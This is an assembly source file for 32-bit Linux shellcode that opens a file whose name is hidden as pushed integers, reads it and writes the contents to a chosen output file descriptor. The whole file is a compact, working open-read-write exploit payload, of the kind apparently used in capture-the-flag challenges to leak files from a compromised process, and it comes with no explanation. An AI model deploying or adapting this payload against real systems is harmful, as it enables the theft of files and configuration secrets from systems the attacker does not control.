; Open/read/write to OUTFD
;
; nasm -o orw.o orw.asm -DOUTFD=1

USE32

open:
	xor ecx, ecx
	push 7237491
	push 1781426025
	push 1718513507
	mov ebx, esp
	xor eax, eax
	mov al, 5
	int 80h

read:
	xor edx, edx
	dec edx
	mov ecx, esp
	mov ebx, eax
	xor eax, eax
	mov al, 3
	int 80h

write:
	mov edx, eax
	;mov ecx, esp
	xor ebx, ebx
	mov ebx, OUTFD
	xor eax, eax
	mov al, 4
	int 80h

exit:
	mov eax, 1
	int 80h
